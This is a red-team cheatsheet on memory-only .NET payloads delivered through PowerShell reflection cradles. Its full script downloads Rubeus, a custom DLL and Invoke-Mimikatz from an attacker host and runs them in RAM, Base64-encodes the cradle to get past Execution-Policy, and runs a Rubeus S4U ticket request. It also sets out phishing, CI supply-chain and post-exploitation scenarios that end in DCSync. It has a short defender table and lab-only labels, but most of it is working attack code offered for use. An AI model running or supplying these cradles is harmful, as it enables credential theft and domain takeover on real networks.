---
description: From One-Liner to Full Red Team Tool
---

# Memory-Only .NET Payloads with PowerShell Reflection Cradles Cheatsheet

Download, load, and execute any C# assembly straight from RAM-no disk-touch, no install rights, no excuses.

The codes and commands referenced within this cheatsheet aim to show defenders how these PowerShell scripts are able to silently download a .NET assembly (EXE or DLL) straight into memory, never touching disk, then executes any method you choose (e.g., Rubeus, Mimikatz, custom payloads) while giving you an optional Base64 wrapper so you can launch the whole thing with a single `powershell-EncodedCommand...` from `cmd.exe`, bypassing PowerShell's Execution-Policy (but not AMSI) and leaving minimal forensic artifacts.

### 1. Tactical Goals (Why Attackers Love It)

| Goal                        | How the Code Delivers                                                       |
| --------------------------- | --------------------------------------------------------------------------- |
| **Diskless payload**        | Assembly bytes stored only in RAM → evades "file-write" EDR rules           |
| **No install / no admin**   | Pure .NET reflection → works as standard user; no `Add-Type` compiler noise |
| **Single-line delivery**    | B64-encoded cradle fits in tweet, URL, QR, metadata field                   |
| **Execution-Policy bypass** | `powershell-EncodedCommand` ignores local policy; only AMSI remains         |
| **Modular**                 | Swap URL → instant Rubeus, Mimikatz, SharpCollection, custom DLL            |
| **Proxy-friendly**          | `System.Net.WebClient` honors system proxy + credentials automatically      |

### 2. Concrete Attack Scenarios

* <mark style="color:yellow;">**Phishing Attachment**</mark>
  * Victim double-clicks "Invoice.doc" → macro executes one-liner B64 → memory-loads Rubeus → performs S4U ticket request → attacker gets service ticket for CIFS/DC.demo.red → DCSync.
* <mark style="color:yellow;">**Supply Chain Drop**</mark>
  * CI pipeline script compromised → inserts reflection cradle → downloads signed but malicious DLL from attacker-controlled Azure blob → builds appear clean; payload lives only in build agent RAM.
* <mark style="color:yellow;">**Post-Exploitation Pivot**</mark>
  * Meterpreter `getsystem` → drops B64 cradle in remote PowerShell session → loads SharpHound → collects BloodHound data → exists without writing a single byte to disk on Domain Controller.

### 3. What It Does Not Achieve (Defender Perspective)

| Misconception                  | Reality                                                                                     |
| ------------------------------ | ------------------------------------------------------------------------------------------- |
| **"B64 hides the payload"**    | Decoder runs locally; AMSI sees plain PowerShell after decode.                              |
| **"Reflection is invisible"**  | AMSI + ETW log the `Load()` call and method invoke.                                         |
| **"No artifacts left behind"** | Script-Block log contains full cradle, if enabled; Sysmon 11 can log WebClient download URI |
| **"Bypasses AV"**              |  Signature on assembly bytes still triggers Windows Defender once scanned.                  |

### 4. Bottom-Line Utility

<mark style="color:red;">**For Red Team:**</mark>

> One-liner, proxy-aware, diskless, policy-neutral way to run any .NET offensive tool inside a corporate laptop with zero install rights.

<mark style="color:blue;">**For Blue Team:**</mark>

> Perfect training scenario to test AMSI, Constrained Language Mode, script-block logging, and proxy SSL-inspection without hunting for mystery EXE files.

### 5. What the Scraps Do

| Block                         | Intent                                                                                                       |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------ |
| **Assembly download-and-run** | Download a .NET DLL/EXE from a URL, load it in memory and call `Main` or any other method.                   |
| **Method-invoke DLL**         | Load a custom DLL and invoke any method by reflection.                                                       |
| **Base64 encode**             | Convert a PowerShell command or entire script to B64 so you can run it with the `powershell-EncodedCommand`. |
| **Launch**                    | Run the B64 blob while bypassing Execution-Policy.                                                           |

### 6. Save as LOLBins-demo.ps1 ONLY inside your personal lab.

```
<#
.SYNOPSIS   In-memory download cradle + reflection examples (LAB USE ONLY)
.DESCRIPTION
  1. Download a raw DLL/EXE from attacker web server
  2. Load with [Reflection.Assembly]::Load()
  3. Execute public static method (Main, runner, etc.)
  4. Encode the cradle to dodge **Execution-Policy** (NOT AMSI)
#>

# ------------------------------------------------------------------
# 1. Download + Run Rubeus (or any assembly) with arguments
# ------------------------------------------------------------------
# NOTE: Make sure the remote assembly is compiled as **AnyCPU** or **x64**
#       and that the **namespace.class** name and method signature are correct.

$url = "http://192.168.31.131:8080/Rubeus.exe"   # attacker host
[Byte[]]$buf = (New-Object System.Net.WebClient).DownloadData($url)
$asm = [System.Reflection.Assembly]::Load($buf)

# Rubeus entry point:  Rubeus.Program::Main(string[])
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1D77F43D96...".Split(" "))


# ------------------------------------------------------------------
# 2. Invoke a custom method inside a DLL
# ------------------------------------------------------------------
$url2  = "http://192.168.31.131:8080/ClassLibrary1.dll"
[Byte[]]$buf2 = (New-Object System.Net.WebClient).DownloadData($url2)
$asm2 = [System.Reflection.Assembly]::Load($buf2)

# Fully-qualified name: Namespace.Class
$type  = $asm2.GetType("ClassLibrary1.Class1")
$method = $type.GetMethod("runner")   # must be **public static**
# invoke with NO arguments (or pass object[] as 2nd param)
$method.Invoke($null, @())


# ------------------------------------------------------------------
# 3. Base-64 encode a **cradle** so you can launch from cmd.exe
# ------------------------------------------------------------------
$cradle = @'
IEX(New-Object Net.WebClient).DownloadString('http://192.168.31.131:8080/Invoke-Mimikatz.ps1')
'@
$bytes      = [System.Text.Encoding]::Unicode.GetBytes($cradle)
$encodedCradle = [Convert]::ToBase64String($bytes)
Write-Host "Encoded cradle:"
Write-Host $encodedCradle

# ------------------------------------------------------------------
# 4. Launch from **cmd.exe** (bypasses Execution-Policy but NOT AMSI)
# ------------------------------------------------------------------
# Copy the B64 string and run:
powershell -EncodedCommand $encodedCradle

# ------------------------------------------------------------------
# 5. Encode an **entire file** (e.g. large script)
# ------------------------------------------------------------------
$bigScript = [System.IO.File]::ReadAllBytes("C:\Tools\Invoke-Mimikatz.ps1")
$b64File   = [System.Convert]::ToBase64String($bigScript)
Set-Content -Path "C:\Temp\script.b64" -Value $b64File

# On target (no file on disk):
powershell -EncodedCommand (Get-Content C:\Temp\script.b64 -Raw)
```

Extra Safety & Evasion Notes
